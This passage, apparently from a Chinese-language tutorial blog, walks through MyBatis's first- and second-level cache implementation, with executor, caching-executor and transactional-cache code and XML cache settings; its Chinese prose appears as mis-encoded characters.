this.localcache = new perpetualcache("localcache");\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        clearlocalcache();\n        return doupdate(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. è·åç»å®sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. åå»ºç¼å­key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        // æ¸çå±é¨ç¼å­ï¼æ¥è¯¢å æ ä¸º0åæ¸çãquerystack é¿åéå½è°ç¨æ¸ç\n        if (querystack == 0 && ms.isflushcacherequired()) {\n            clearlocalcache();\n        }\n        list<e> list;\n        try {\n            querystack++;\n            // æ ¹æ®cachekeyä»localcacheä¸­æ¥è¯¢æ°æ®\n            list = resulthandler == null ? (list<e>) localcache.getobject(key) : null;\n            if (list == null) {\n                list = queryfromdatabase(ms, parameter, rowbounds, resulthandler, key, boundsql);\n            }\n        } finally {\n            querystack--;\n        }\n        if (querystack == 0) {\n            if (configuration.getlocalcachescope() == localcachescope.statement) {\n                clearlocalcache();\n            }\n        }\n        return list;\n    }\n\n    private <e> list<e> queryfromdatabase(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        list<e> list;\n        localcache.putobject(key, executionplaceholder.execution_placeholder);\n        try {\n            list = doquery(ms, parameter, rowbounds, resulthandler, boundsql);\n        } finally {\n            localcache.removeobject(key);\n        }\n        // å­å¥ç¼å­\n        localcache.putobject(key, list);\n        return list;\n    }\n\n    protected abstract int doupdate(mappedstatement ms, object parameter) throws sqlexception;\n\n    protected abstract <e> list<e> doquery(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) throws sqlexception;\n\n    @override\n    public transaction gettransaction() {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        return transaction;\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("cannot commit, transaction is already closed");\n        }\n        clearlocalcache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        if (!closed) {\n            try {\n                clearlocalcache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        if (!closed) {\n            localcache.clear();\n        }\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        cachekey cachekey = new cachekey();\n        cachekey.update(ms.getid());\n        cachekey.update(rowbounds.getoffset());\n        cachekey.update(rowbounds.getlimit());\n        cachekey.update(boundsql.getsql());\n        list<parametermapping> parametermappings = boundsql.getparametermappings();\n        typehandlerregistry typehandlerregistry = ms.getconfiguration().gettypehandlerregistry();\n        for (parametermapping parametermapping : parametermappings) {\n            object value;\n            string propertyname = parametermapping.getproperty();\n            if (boundsql.hasadditionalparameter(propertyname)) {\n                value = boundsql.getadditionalparameter(propertyname);\n            } else if (parameterobject == null) {\n                value = null;\n            } else if (typehandlerregistry.hastypehandler(parameterobject.getclass())) {\n                value = parameterobject;\n            } else {\n                metaobject metaobject = configuration.newmetaobject(parameterobject);\n                value = metaobject.getvalue(propertyname);\n            }\n            cachekey.update(value);\n        }\n        if (configuration.getenvironment() != null) {\n            cachekey.update(configuration.getenvironment().getid());\n        }\n        return cachekey;\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            try {\n                rollback(forcerollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (sqlexception e) {\n            logger.warn("unexpected exception on closing transaction.  cause: " + e);\n        } finally {\n            transaction = null;\n            localcache = null;\n            closed = true;\n        }\n    }\n\n    protected void closestatement(statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (sqlexception ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n\n\nå¯ä»¥çå° æ§è¡å¨éé¢ç»´æ¤äº query update commit ç­æ¹æ³ï¼å¨æ§è¡æ¥è¯¢çæ¶åä¼åçæ cachekey ï¼ä¼æç§ namespace.id + åé¡µoffset + åé¡µlimit + æ§è¡çsqlè¯­å¥ + æ¥è¯¢æ¡ä»¶çå¼ + ç¯å¢id çæå¯ä¸ç keyï¼ç¶ååä¸ºæ¥è¯¢ç¼å­ç keyï¼æ¥è¯¢ç»æåä¸º valueï¼å¦æåä¸å sqlsession æ§è¡ç¸åè¯­å¥åæ¡ä»¶ä»¥ååé¡µç­ï¼å°±ä¼ä»ç¼å­ä¸­å½ä¸­å¹¶è¿åç»æãç¼å­çæ¸é¤ï¼å°±æ¯å½è¯¥ sqlsession æ§è¡ updateï¼commitï¼closeï¼rollback æ¶è¯¥ sqlsession å°±æ¸é¤ç¼å­ã\n\nå¨ sql è¯­å¥ä¸­ä¹å¯ä»¥è®¾ç½®æ¸é¤ç¼å­ï¼åªéè¦å¨ <select>ã<insert> å <update> ç­ sql æ ç­¾ä¸­è®¾ç½® flushcache="true" å±æ§ä¼å¼ºå¶æ¸ç©ºæ¬å°ç¼å­ï¼ä½¿å¾ä¸æ¬¡æ¥è¯¢æ¶éæ°ä»æ°æ®åºä¸­è·åæ°æ®ãéç¨äºä¸çº§ç¼å­åäºçº§ç¼å­\n\n<select id="selectbyid" resulttype="com.example.user" flushcache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\n\n# äºçº§ç¼å­\n\näºçº§ç¼å­æ¯ä¸º namespace ä¹å« mapper çº§å«çç¼å­ï¼æ¯è·¨ sqlsession çï¼ä»ä¼å¨åæçæ§è¡å¨ä¸å°è£ä¸ä¸ª cachingexecutor ï¼æ¥ç®¡çç¼å­ï¼ cachingexecutor ä½¿ç¨äºè£é¥°å¨æ¨¡å¼æ¥è£é¥°åºç¡ç executor æ§è¡å¨ã\n\n\n# è§£æ\n\nå¨äºçº§ç¼å­ä¸­çéç½®æ¹å¼å·ä½å¦ä¸\n\n\x3c!-- å¿é¡»åå¼å¯ç¼å­ --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false äºçº§ç¼å­æ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheenabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- æå®å¨æä¸ªmapperä¸­ä½¿ç¨ --\x3e\n<mapper namespace="com.example.mymapper">\n    \x3c!-- è®¾ç½®è¯¥mapperçäºçº§ç¼å­ --\x3e\n    <cache eviction="lru" flushinterval="100000" readonly="true" size="1024"/>\n    \x3c!-- usecacheï¼è¡¨ç¤ºæ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å¦æè®¾ç½®ä¸º trueï¼åä¼ä½¿ç¨äºçº§ç¼å­ãå¯¹äº select åç´ ï¼é»è®¤å¼ä¸º trueã --\x3e\n    \x3c!-- usecache å±æ§åªè½æ§å¶æ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å®ä¸è½å³é­ä¸çº§ç¼å­ãä¸çº§ç¼å­æ¯ mybatis çé»è®¤è¡ä¸ºï¼å®æ»æ¯å¼å¯çï¼æ æ³å³é­ã --\x3e\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¶ä¸­ <cache > æ ç­¾æå¤ä¸ªå±æ§ï¼è¿éä¸ä¸ä»ç»ä¸ä¸ï¼\n\n * typeï¼å¯ä»¥æå®èªå®ä¹ç¼å­ï¼ä½æ¯è¯¥ç±»å¿é¡»å®ç°ï¼èä¸æ¯å¨ç±»å\n * evictionï¼ç¼å­åæ¶ç­ç¥ï¼é»è®¤ä¸º lruï¼least recently usedï¼ï¼ç­ç¥ä»ç»å¦ä¸ï¼\n   lruï¼æç§è®¿é®æ¶é´æåºï¼æè¿æªä½¿ç¨çæ°æ®ä¼åæ¸é¤ã\n   fifoï¼æç§æå¥æ¶é´æåºï¼åæå¥çæ°æ®åæ¸é¤ã\n   softï¼åºäºåå¾åæ¶ç®æ³ï¼å½ç³»ç»åå­ä¸è¶³æ¶ï¼ä¼ä¼åæ¸çä¸å¸¸ç¨çãå ç¨åå­è¾å¤çæ°æ®ã\n   weakï¼å¼±å¼ç¨æºå¶ï¼å½ jvm è¿è¡åå¾åæ¶æ¶ï¼å¦æå¤æ­ä¸ä¸ªå¯¹è±¡åªè¢«å¼±å¼ç¨æåï¼åä¼å°å¶åæ¶ã\n * flushintervalï¼å·æ°é´éæ¶é´ï¼è¡¨ç¤ºå¤é¿æ¶é´å·æ°ä¸æ¬¡ç¼å­ï¼åä½ä¸ºæ¯«ç§ï¼é»è®¤ä¸å·æ°ã\n * sizeï¼ç¼å­çå¤§å°ï¼è¡¨ç¤ºæå¤å¯ä»¥ç¼å­å¤å°ä¸ªå¯¹è±¡ã\n * readonlyï¼æ¯å¦åªè¯»ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºå¯ç¨ç¼å­æ´æ°æºå¶ã\n * blockingï¼æ¯å¦å¯ç¨é»å¡ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºä¸å¯ç¨ã\n\n> flushinterval é»è®¤æåµä¸ï¼mybatis éç¨åºäº perpetualcache (æ°¸ä¹ç¼å­) çç¼å­å®ç°æ¹å¼ï¼å³ç¼å­ä¼ä¸ç´ä¿å­å¨åå­ä¸­ï¼ç´å°ä¼è¯å³é­æ¶æè¢«æ¸é¤ãèå½æä»¬ä½¿ç¨åºäº ehcache çç¼å­å®ç°æ¶ï¼å¯ä»¥éè¿è®¾ç½® flushinterval å±æ§æ§å¶ç¼å­çå·æ°æ¶é´ï¼å³å®æ¶å°ç¼å­ä¸­çæ°æ®åå¥å°ç£çææä¹åå­å¨ä¸­ï¼ä»¥é¿åç¼å­è¿æãå¤±ææåå­æº¢åºç­é®é¢ã\n\nå½ mybaits å¯å¨åä¼è¯»å°äºçº§ç¼å­çéç½®ï¼åä¼è¿è¡ <cache> åºç¡çè§£æï¼å¾å° xml éé¢çå±æ§å¼ï¼å¶æ¬¡ç¨å¼ä¿¡æ¯ç»æä¸ä¸ª cache å¯¹è±¡ï¼å¹¶æè¿ä¸ª cache å¯¹è±¡ç»´æ¤å°å¨å±éç½® configuration ä¸­ï¼è¯¥å¨å±éç½®éé¢æ¯ç»´æ¤ä¸ä¸ª map ç»æçå®¹å¨\n\n// å¼å§è§£æ\nprivate void cacheelement(element context) {\n    if (context == null) return;\n    // åºç¡éç½®ä¿¡æ¯ï¼é»è®¤æ¯æ°¸æç¼å­\n    string type = context.attributevalue("type", "perpetual");\n    class<? extends cache> typeclass = typealiasregistry.resolvealias(type);\n    // ç¼å­éå fifo\n    string eviction = context.attributevalue("eviction", "fifo");\n    class<? extends cache> evictionclass = typealiasregistry.resolvealias(eviction);\n    long flushinterval = long.valueof(context.attributevalue("flushinterval"));\n    integer size = integer.valueof(context.attributevalue("size"));\n    boolean readwrite = !boolean.parseboolean(context.attributevalue("readonly", "false"));\n    boolean blocking = !boolean.parseboolean(context.attributevalue("blocking", "false"));\n\n    // è§£æé¢å¤å±æ§ä¿¡æ¯ï¼<property name="cachefile" value="/tmp/xxx-cache.tmp"/>\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // æå»ºç¼å­\n    builderassistant.usenewcache(typeclass, evictionclass, flushinterval, size, readwrite, blocking, props);\n}\n\n// æå»ºcache\npublic cache usenewcache(class<? extends cache> typeclass,\n                        class<? extends cache> evictionclass,\n                        long flushinterval,\n                        integer size,\n                        boolean readwrite,\n                        boolean blocking,\n                        properties props) {\n    // å¤æ­ä¸ºnullï¼åç¨é»è®¤å¼\n    typeclass = valueordefault(typeclass, perpetualcache.class);\n    evictionclass = valueordefault(evictionclass, fifocache.class);\n\n    // å»ºé èæ¨¡å¼æå»º cache [currentnamespace=cn.bugstack.mybatis.test.dao.iactivitydao]\n    cache cache = new cachebuilder(currentnamespace)\n            .implementation(typeclass)\n            .adddecorator(evictionclass)\n            .clearinterval(flushinterval)\n            .size(size)\n            .readwrite(readwrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // æ·»å ç¼å­\n    configuration.addcache(cache);\n    // ç»èªå·±ç»´æ¤ä¸ä¸ª cache ä»¥ä¾¿åç»­ mappedstatement ç¨å°\n    currentcache = cache;\n    return cache;\n}\n\n// æ·»å å° configurationå¨å±éç½®ç»´æ¤ç cachesä¸­\npublic class configuration {\n    // ç¼å­,å­å¨mapé\n    protected final map<string, cache> caches = new hashmap<>();\n    public void addcache(cache cache) {\n        caches.put(cache.getid(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nç¼å­è§£æè¿äºï¼ä½æ¯æä¸»è¦çè¿æ¯ <select> æ ç­¾çä¸äºï¼æ ç­¾ä¸é¢æè¿°äºå·ä½çç¼å­æ¯å¦ä½¿ç¨ï¼ç¼å­æ¯å¦æ¸é¤ï¼æä»¥è¿éè¦è§£ææ ç­¾ä¸çç¼å­ä¿¡æ¯ï¼ä¸»è¦æ¯ flushcache å usecache è¿ä¸¤ä¸ªå±æ§\n\n// è§£ææä½\npublic void parsestatementnode() {\n    string id = element.attributevalue("id");\n    // åæ°ç±»å\n    string parametertype = element.attributevalue("parametertype");\n    class<?> parametertypeclass = resolvealias(parametertype);\n    // å¤é¨åºç¨ resultmap\n    string resultmap = element.attributevalue("resultmap");\n    // ç»æç±»å\n    string resulttype = element.attributevalue("resulttype");\n    class<?> resulttypeclass = resolvealias(resulttype);\n    // è·åå½ä»¤ç±»å(select|insert|update|delete)\n    string nodename = element.getname();\n    sqlcommandtype sqlcommandtype = sqlcommandtype.valueof(nodename.touppercase(locale.english));\n\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n    boolean flushcache = boolean.parseboolean(element.attributevalue("flushcache", string.valueof(!isselect)));\n    boolean usecache = boolean.parseboolean(element.attributevalue("usecache", string.valueof(isselect)));\n\n    // è·åé»è®¤è¯­è¨é©±å¨å¨\n    class<?> langclass = configuration.getlanguageregistry().getdefaultdriverclass();\n    languagedriver langdriver = configuration.getlanguageregistry().getdriver(langclass);\n\n    // è§£æ<selectkey> step-14 æ°å¢\n    processselectkeynodes(id, parametertypeclass, langdriver);\n\n    // è§£ææsqlsourceï¼dynamicsqlsource/rawsqlsource\n    sqlsource sqlsource = langdriver.createsqlsource(configuration, element, parametertypeclass);\n\n    // å±æ§æ è®°ãä»å¯¹ insert æç¨ã, mybatis ä¼éè¿ getgeneratedkeys æèéè¿ insert è¯­å¥ç selectkey å­åç´ è®¾ç½®å®çå¼ step-14 æ°å¢\n    string keyproperty = element.attributevalue("keyproperty");\n\n    keygenerator keygenerator = null;\n    string keystatementid = id + selectkeygenerator.select_key_suffix;\n    keystatementid = builderassistant.applycurrentnamespace(keystatementid, true);\n\n    if (configuration.haskeygenerator(keystatementid)) {\n        keygenerator = configuration.getkeygenerator(keystatementid);\n    } else {\n        keygenerator = configuration.isusegeneratedkeys() && sqlcommandtype.insert.equals(sqlcommandtype) ? new jdbc3keygenerator() : new nokeygenerator();\n    }\n    // è°ç¨å©æç±»\n    builderassistant.addmappedstatement(id,\n            sqlsource,\n            sqlcommandtype,\n            parametertypeclass,\n            resultmap,\n            resulttypeclass,\n            flushcache,\n            usecache,\n            keygenerator,\n            keyproperty,\n            langdriver);\n}\n\n// æä¿¡æ¯æ·»å å° mappedstatementå¯¹è±¡\npublic mappedstatement addmappedstatement(\n        string id,\n        sqlsource sqlsource,\n        sqlcommandtype sqlcommandtype,\n        class<?> parametertype,\n        string resultmap,\n        class<?> resulttype,\n        boolean flushcache,\n        boolean usecache,\n        keygenerator keygenerator,\n        string keyproperty,\n        languagedriver lang\n) {\n    // ç»idå ä¸namespaceåç¼ï¼cn.bugstack.mybatis.test.dao.iuserdao.queryuserinfobyid\n    id = applycurrentnamespace(id, false);\n    //æ¯å¦æ¯selectè¯­å¥\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n\n    mappedstatement.builder statementbuilder = new mappedstatement.builder(configuration, id, sqlcommandtype, sqlsource, resulttype);\n    statementbuilder.resource(resource);\n    statementbuilder.keygenerator(keygenerator);\n    statementbuilder.keyproperty(keyproperty);\n\n    // ç»ææ å°ï¼ç» mappedstatement#resultmaps\n    setstatementresultmap(resultmap, resulttype, statementbuilder);\n    // ç»´æ¤ç¼å­ä¿¡æ¯\n    setstatementcache(isselect, flushcache, usecache, currentcache, statementbuilder);\n    mappedstatement statement = statementbuilder.build();\n    // æ å°è¯­å¥ä¿¡æ¯ï¼å»ºé å®å­æ¾å°éç½®é¡¹ä¸­\n    configuration.addmappedstatement(statement);\n    return statement;\n}\n\n// ç»statementæ·»å ç¼å­ä¿¡æ¯\nprivate void setstatementcache(\n        boolean isselect,\n        boolean flushcache,\n        boolean usecache,\n        cache cache,\n        mappedstatement.builder statementbuilder) {\n    flushcache = valueordefault(flushcache, !isselect);\n    usecache = valueordefault(usecache, isselect);\n    statementbuilder.flushcacherequired(flushcache);\n    statementbuilder.usecache(usecache);\n    statementbuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\nå¨å·ä½ç addmappedstatement çæ¶åï¼å¯ä»¥çå°ä¼å¾å°ä¸ä¸ª mappedstatement å¯¹è±¡ï¼è¯¥å¯¹è±¡å°±æ¯å°è£äº sql æ ç­¾çææä¿¡æ¯ï¼å¨ setstatementcache æ¹æ³ä¸­ï¼ä¸ä»åªæ flushcacheåusecache è¿è¡äºè®¾ç½®ï¼é¢å¤çè¿å¸¦æä¸ä¸ª cache ï¼è¯¥ cache å°±æ¯å¨è°ç¨ usenewcache æ¹æ³ï¼åé¨èµå¼ç currentcache ï¼ä»ä»¬çæ¹æ³æ¯å¨åä¸ä¸ªç±»ä¸­ï¼å æ­¤å¯ä»¥ä½¿ç¨ãè¿æ · mappedstatement å¯¹è±¡ä¹å°±æ¥æäº <cache> æ ç­¾çè½åï¼å°æ­¤è§£æå®æ¯\n\n\n# åå¤\n\nåä¸çº§ç¼å­ä¸æ ·ï¼é½æ¯å¨ opensession çæ¶åå»åå®ä¾åï¼ä½æ¯ä¸åçæ¯ï¼äºçº§ç¼å­ä¼å¨ä¸çº§ç¼å­ä¸è¿è¡ä¸ä¸ªè£é¥°ï¼å¹¶ä¸é¦è¦ä¼å¤æ­æ¯å¦åè®¸å¼å¯äºçº§ç¼å­ã\n\nif (cacheenabled) {\n    executor = new cachingexecutor(executor);\n}\n\n\n1\n2\n3\n\n\ncachingexecutor æ¥æ¶ executor ï¼å¹¶å¯¹å¶è¿è¡åè£ï¼åé¨æ¹æ³ä¾ç¶è°ç¨çæ¯ baseexecutor çç¸å³æ¹æ³ã cachingexecutor åé¨è¿ç»´æ¤äº transactionalcachemanager äºå¡ç¼å­ç®¡çå¨ï¼è¯¥ç®¡çå¨åé¨ç»´æ¤ map<cache, transactionalcache> ï¼ transactionalcache åé¨åç»´æ¤äº cache ä»¥å entriesmissedincache å entriestoaddoncommit\n\n\n# æ§è¡\n\npublic class cachingexecutor implements executor {\n\n    private logger logger = loggerfactory.getlogger(cachingexecutor.class);\n    private executor delegate;\n    // äºå¡ç¼å­ç®¡çå¨\n    private transactionalcachemanager tcm = new transactionalcachemanager();\n\n    public cachingexecutor(executor delegate) {\n        this.delegate = delegate;\n        delegate.setexecutorwrapper(this);\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        return delegate.update(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        cache cache = ms.getcache();\n        if (cache != null) {\n            flushcacheifrequired(ms);\n            if (ms.isusecache() && resulthandler == null) {\n                @suppresswarnings("unchecked")\n                list<e> list = (list<e>) tcm.getobject(cache, key);\n                if (list == null) {\n                    list = delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n                    // cacheï¼ç¼å­éåå®ç°ç±»ï¼fifo\n                    // keyï¼åå¸å¼ [mappedstatementid + offset + limit + sql + queryparams + environment]\n                    // listï¼æ¥è¯¢çæ°æ®\n                    tcm.putobject(cache, key, list);\n                }\n                // æå°è°è¯æ¥å¿ï¼è®°å½äºçº§ç¼å­è·åæ°æ®\n                if (logger.isdebugenabled() && cache.getsize() > 0) {\n                    logger.debug("äºçº§ç¼å­ï¼{}", json.tojsonstring(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. è·åç»å®sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. åå»ºç¼å­key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public transaction gettransaction() {\n        return delegate.gettransaction();\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            if (forcerollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forcerollback);\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        delegate.clearlocalcache();\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        return delegate.createcachekey(ms, parameterobject, rowbounds, boundsql);\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        throw new unsupportedoperationexception("this method should not be called");\n    }\n\n    private void flushcacheifrequired(mappedstatement ms) {\n        cache cache = ms.getcache();\n        if (cache != null && ms.isflushcacherequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class transactionalcachemanager {\n\n    private map<cache, transactionalcache> transactionalcaches = new hashmap<>();\n\n    public void clear(cache cache) {\n        gettransactionalcache(cache).clear();\n    }\n\n    /**\n     * å¾å°æä¸ªtransactionalcacheçå¼\n     */\n    public object getobject(cache cache, cachekey key) {\n        return gettransactionalcache(cache).getobject(key);\n    }\n\n    public void putobject(cache cache, cachekey key, object value) {\n        gettransactionalcache(cache).putobject(key, value);\n    }\n\n    /**\n     * æäº¤æ¶å¨é¨æäº¤\n     */\n    public void commit() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.commit();\n        }\n    }\n\n    /**\n     * åæ»æ¶å¨é¨åæ»\n     */\n    public void rollback() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.rollback();\n        }\n    }\n\n    private transactionalcache gettransactionalcache(cache cache) {\n        transactionalcache txcache = transactionalcaches.get(cache);\n        if (txcache == null) {\n            txcache = new transactionalcache(cache);\n            transactionalcaches.put(cache, txcache);\n        }\n        return txcache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class transactionalcache implements cache {\n\n    private cache delegate;\n    // commit æ¶è¦ä¸è¦æ¸ç¼å­\n    private boolean clearoncommit;\n    // commit æ¶è¦æ·»å çåç´ \n    private map<object, object> entriestoaddoncommit;\n    private set<object> entriesmissedincache;\n\n    public transactionalcache(cache delegate) {\n        // delegate = fifocache\n        this.delegate = delegate;\n        // é»è®¤ commit æ¶ä¸æ¸ç¼å­\n        this.clearoncommit = false;\n        this.entriestoaddoncommit = new hashmap<>();\n        this.entriesmissedincache = new hashset<>();\n    }\n\n    @override\n    public string getid() {\n        return delegate.getid();\n    }\n\n    @override\n    public int getsize() {\n        return delegate.getsize();\n    }\n\n    @override\n    public object getobject(object key) {\n        // keyï¼cachekey æ¼è£åçåå¸ç \n        object object = delegate.getobject(key);\n        if (object == null) {\n            entriesmissedincache.add(key);\n        }\n        return clearoncommit ? null : object;\n    }\n\n    @override\n    public void putobject(object key, object object) {\n        entriestoaddoncommit.put(key, object);\n    }\n\n    @override\n    public object removeobject(object key) {\n        return null;\n    }\n\n    @override\n    public void clear() {\n        clearoncommit = true;\n        entriestoaddoncommit.clear();\n    }\n\n    public void commit() {\n        if (clearoncommit) {\n            delegate.clear();\n        }\n        flushpendingentries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockmissedentries();\n        reset();\n    }\n\n    private void reset() {\n        clearoncommit = false;\n        entriestoaddoncommit.clear();\n        entriesmissedincache.clear();\n    }\n\n    /**\n     * å·æ°æ°æ®å° mappedstatement#cache ä¸­ï¼ä¹å°±æ¯ææ°æ®å¡«åå° mapper xml çº§å«ä¸ã\n     * flushpendingentries æ¹æ³æäºå¡ç¼å­ä¸çæ°æ®ï¼å¡«åå° fifocache ä¸­ã\n     */\n    private void flushpendingentries() {\n        for (map.entry<object, object> entry : entriestoaddoncommit.entryset()) {\n            delegate.putobject(entry.getkey(), entry.getvalue());\n        }\n        for (object entry : entriesmissedincache) {\n            if (!entriestoaddoncommit.containskey(entry)) {\n                delegate.putobject(entry, null);\n            }\n        }\n    }\n\n    private void unlockmissedentries() {\n        for (object entry : entriesmissedincache) {\n            delegate.putobject(entry, null);\n        }\n    